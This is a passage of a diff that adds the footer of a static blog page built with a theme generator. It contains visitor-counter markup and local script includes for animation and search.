+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+  
+    <span class="post-meta-divider">|</span>
+  
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+    
+  
+  <script color='0,0,0' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js?v=3.1.0"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="/js/utils.js?v=7.4.2"></script><script src="/js/motion.js?v=7.4.2"></script>
+<script src="/js/schemes/pisces.js?v=7.4.2"></script>
+<script src="/js/next-boot.js?v=7.4.2"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.4.2"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
